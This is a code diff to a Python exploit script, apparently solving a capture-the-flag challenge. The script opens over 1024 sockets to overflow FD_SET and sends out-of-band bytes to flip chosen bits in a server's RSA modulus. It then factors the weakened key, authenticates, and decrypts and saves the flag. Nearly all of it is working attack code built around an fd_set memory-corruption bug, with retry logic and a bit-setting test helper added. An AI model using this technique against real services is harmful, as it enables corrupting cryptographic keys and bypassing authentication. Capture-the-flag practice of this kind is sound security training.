@@ -70,7 +70,6 @@ def make_connections(host, port, num_clients):
     for i in range(num_clients):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
             sock.connect((host, port))
             sockets.append(sock)
             print(".", end='', flush=True)
@@ -85,7 +84,18 @@ def make_connections(host, port, num_clients):
             break
     print()
 
-    return sockets
+    fd_to_socket = {}
+    # Read the menu to get the sensor ID
+    for s in sockets:
+        data = s.recv(1024)
+        # Parse out "This is sensor ID %d."
+        for line in data.splitlines():
+            if line.startswith(b'This is sensor ID '):
+                sensor_id = int(line.split()[-1][:-1])
+                fd_to_socket[sensor_id] = s
+                break
+
+    return fd_to_socket
 
 def get_key(r):
     # Read the menu and ask for the public key
@@ -232,19 +242,36 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
     already_tried = set()
     while already_tried != set(range(len(overflow_sockets))):
         s = random.randint(0, len(overflow_sockets)-1)
+        # If we already tried this bit, skip it
+        if s in already_tried:
+            continue
+        # The first byte of the key is not allowed to be zero. So if we don't yet
+        # have a bit set in the first byte, sample again
+        if (not already_tried or min(already_tried) > 7) and s > 7:
+            print(f"Skipping bit {s} (for now) because we need to set a bit in the first byte")
+            continue
         print(f"Picked overflow socket / bit {s} to corrupt")
         predicted = predict_bit_pattern(already_tried | {s}, controlled_bits)
         sock = overflow_sockets[s]
         sock.send(b'1', socket.MSG_OOB)
         time.sleep(0.1)
         already_tried.add(s)
-        tries = 10
+        tries = 11
         # Pause the client thread so that it doesn't overwrite the key
         with PausedClient(r):
-            e, modulus = get_key(r)
             while True:
-                if num_bits_set(modulus) > len(already_tried):
-                    print(f"WARNING: Key has more bits set than expected ({num_bits_set(modulus)} > {len(already_tried)})")
+                tries -= 1
+                if tries == 0:
+                    print(f"WARNING: Tried too many times; giving up")
+                    already_tried.remove(s)
+                    break
+                resume_client(r)
+                time.sleep(0.1)
+                pause_client(r)
+                e, modulus = get_key(r)
+                if num_bits_set(modulus) == controlled_bits:
+                    print(f"WARNING: Key has {controlled_bits} bits set; this means that FD_SET has filled the fdset but select() has not returned yet.")
+                    continue
                 compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
                 guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
                 print(f"Prd: {predicted.hex()} ({guessed})")
@@ -253,21 +280,12 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
                     # already_tried = set(get_bit_pattern_from_key(modulus))
                 else:
                     break
-                resume_client(r)
-                time.sleep(0.1)
-                pause_client(r)
-                e, modulus = get_key(r)
-                tries -= 1
-                if tries == 0:
-                    print(f"WARNING: Tried too many times; giving up")
-                    already_tried.remove(s)
-                    break
             if modulus == current_modulus:
                 print(f"WARNING: Key is unchanged; something went wrong :(")
                 # No point trying to factor the same modulus again
                 continue
-        if tries == 0:
-            continue
+        # if tries == 0:
+        #     continue
         current_modulus = modulus
         key = try_factor(modulus, e)
         if key:
@@ -302,6 +320,35 @@ def solve_randbits(r, csock, overflow_sockets, controlled_bits, initial_modulus,
             return key
     return None
 
+def test_bitset(r, csock, sockets, controlled_bits, initial_modulus):
+    overflow_sockets = {i-1024: s for i,s in sockets.items() if i >= 1024}
+    print(f"Overflow sockets: {overflow_sockets}")
+    # Try setting bits one by one
+    current_modulus = initial_modulus
+    for s in range(len(overflow_sockets)-1, -1, -1):
+        print(f"Trying to set bit {s}")
+        predicted = predict_bit_pattern(set(range(s, len(overflow_sockets))), controlled_bits)
+        sock = overflow_sockets[s]
+        sock.send(b'1', socket.MSG_OOB)
+        time.sleep(1)
+        # Pause the client thread so that it doesn't overwrite the key
+        with PausedClient(r):
+            while True:
+                e, modulus = get_key(r)
+                compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+                guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
+                print(f"Prd: {predicted.hex()} ({guessed})")
+                if guessed != "CORRECT":
+                    print(f"WARNING: Prediction was wrong; trying again...")
+                else:
+                    break
+                resume_client(r)
+                sock = sockets[s]
+                sock.send(b'1', socket.MSG_OOB)
+                time.sleep(1)
+                pause_client(r)
+        current_modulus = modulus
+
 # Context wrapper that pauses the client thread
 class PausedClient:
     def __init__(self, r):
@@ -335,7 +382,11 @@ def solve(args):
     # and FD_SETSIZE is 1024. So the bits we control are len(sockets) - 1024 + 7
     controlled_bits = len(sockets) + 1 - 1024 + 7
     print(f"Controlled bits: {controlled_bits}")
-    overflow_sockets = sockets[-controlled_bits:]
+
+    # Test that we can set bits
+    # test_bitset(r, csock, sockets, controlled_bits, initial_modulus)
+    # return
+    overflow_sockets = {i-1024: s for i,s in sockets.items() if i >= 1024}
 
     key = solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus)
     if key is None:
@@ -343,23 +394,33 @@ def solve(args):
         return
 
     tries = 1
-    while True:
+    while tries < 20:
         with PausedClient(r):
-            success = authenticate(r, key)
-            if success:
-                print(f"Successfully authenticated after {tries} tries! :)")
-                flagdata_bytes = get_flag(r)
-                flag = decrypt(key.n, key.e, key.d, flagdata_bytes)
-                print(f"Retrieved flag, {len(flag)} bytes!")
-                # Save the flag to a file
-                with open(args.output, 'wb') as f:
-                    f.write(flag)
-                print(f"Saved flag to {args.output}")
-                break
-            else:
+            success_auth = False
+
+            if not success_auth:
+                success_auth = authenticate(r, key)
+
+            if not success_auth:
                 tries += 1
+                continue
+
+            print(f"Successfully authenticated after {tries} tries! :)")
+            flagdata_bytes = get_flag(r)
+            flag = decrypt(key.n, key.e, key.d, flagdata_bytes)
+            if not flag:
+                print("Failed to decrypt flag")
+                tries += 1
+                continue
+
+            print(f"Retrieved flag, {len(flag)} bytes!")
+            # Save the flag to a file
+            with open(args.output, 'wb') as f:
+                f.write(flag)
+            print(f"Saved flag to {args.output}")
+            break
     r.close()
-    for s in sockets:
+    for s in sockets.values():
         s.close()
 
 def check_prereqs():
@@ -395,7 +456,11 @@ def main():
     # Making lots of connections so increase the open files limit
     increase_open_files_limit()
 
-    solve(args)
+    try:
+        solve(args)
+    except Exception as e:
+        print(f"Error: {e}")
+
     if args.kill:
         kill_server(args)
 
